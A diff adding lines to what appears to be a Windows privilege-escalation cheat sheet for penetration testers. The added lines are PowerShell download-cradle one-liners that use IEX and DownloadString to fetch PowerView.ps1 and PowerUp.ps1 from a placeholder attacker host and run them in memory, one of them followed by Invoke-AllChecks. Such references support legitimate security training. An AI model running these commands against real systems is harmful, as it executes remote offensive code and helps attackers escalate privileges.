@@ -409,6 +409,16 @@ ps> IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>/Invoke-SomeS
 * PowerUP - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 
 
+PS Enumeration tools (check available commands at bottom of the file):
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>/PowerView.ps1');
+```
+
+PS Automatic enumeration:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>/PowerUp.ps1'); Invoke-AllChecks
+```
+
 ## Installed Software
 
 You are usually looking for weak folder/file permissions on installed software or buffer overflows in non-standard software.
